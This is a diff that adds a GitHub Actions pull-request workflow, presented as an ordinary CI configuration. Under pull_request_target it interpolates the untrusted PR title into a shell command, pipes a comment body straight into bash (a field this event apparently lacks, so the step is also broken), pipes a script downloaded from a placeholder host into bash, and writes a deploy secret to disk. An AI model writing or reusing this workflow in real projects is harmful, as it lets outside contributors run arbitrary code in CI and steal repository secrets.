@@ -1,0 +1,23 @@
+name: PR checks
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run PR script
+        run: |
+          echo "Running checks for PR ${{ github.event.pull_request.title }}"
+          echo "${{ github.event.comment.body }}" | bash
+          curl -sSL https://example.invalid/setup.sh | bash
+      - name: Deploy
+        run: |
+          echo "${{ secrets.DEPLOY_TOKEN }}" > token.txt
+          ./deploy.sh
